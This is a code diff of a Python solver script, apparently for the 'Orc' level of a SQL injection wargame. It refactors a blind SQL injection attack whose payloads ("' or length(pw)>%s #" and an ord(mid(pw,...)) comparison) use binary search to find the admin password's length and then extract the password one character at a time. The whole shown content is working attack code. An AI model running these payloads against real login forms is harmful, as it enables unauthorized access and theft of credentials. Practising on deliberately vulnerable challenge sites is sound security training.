@@ -4,6 +4,10 @@ import los
 from getpass import getpass
 
 
+def check_func(response: str) -> bool:
+    return 'Hello admin' in response
+
+
 def main():
     '''
     Orc
@@ -34,13 +38,15 @@ def main():
         exit(1)
 
     payload = "' or length(pw)>%s #"
-    len_of_key = los.find_key_len(url, payload, 'pw', 'Hello admin', cook)
+    param = dict(pw=payload)
+    len_of_key = los.find_key_len(url, param, check_func, cook)
 
     print(len_of_key)
 
     payload = "' or id='admin' and ord(mid(pw,%s,1))%s #"
-    result = los.find_binary(url, payload,
-                             'pw', 'Hello admin', 32, 127, len_of_key, cook)
+    param = dict(pw=payload)
+    result = los.find_binary(url, param, check_func,
+                             32, 127, len_of_key, cook)
 
     print(result)
 
